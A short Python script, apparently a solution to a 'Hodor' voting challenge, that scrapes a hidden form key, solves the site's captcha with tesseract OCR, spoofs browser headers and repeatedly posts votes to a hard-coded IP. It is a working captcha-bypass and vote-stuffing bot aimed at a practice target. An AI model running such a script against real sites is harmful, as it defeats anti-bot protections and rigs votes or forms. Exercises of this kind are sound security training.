#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import os

data_form = {'id':'234', 'holdthedoor': 'submit', 'key': '', 'captcha':''}

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
          'referer': 'http://158.69.76.135/level3.php'}

session_hodor = requests.session()


for i in range(5):
    page_html = session_hodor.get("http://158.69.76.135/level3.php")
    html_order = BeautifulSoup(page_html.text, "html.parser")

    hidden = html_order.find("form",{"method":"post"})
    hidden = hidden.find("input",{"type":"hidden"})

    data_form["key"] = hidden["value"]

    captcha = session_hodor.get("http://158.69.76.135/captcha.php").content
    content_captcha = open("/tmp/captcha.png", "wb")
    content_captcha.write(captcha)
    content_captcha.close()

    exec('import subprocess; subprocess.call(["/usr/bin/tesseract", "/tmp/captcha.png", "/tmp/captcha_result"])')
    os.remove("/tmp/captcha.png")

    read_captcha = open("/tmp/captcha_result.txt", "r")
    captcha_result = read_captcha.read().replace('\n', '')
    read_captcha.close()

    data_form['captcha'] = captcha_result
    session_hodor.post("http://158.69.76.135/level3.php", data = data_form, headers = header)
    print(data_form)
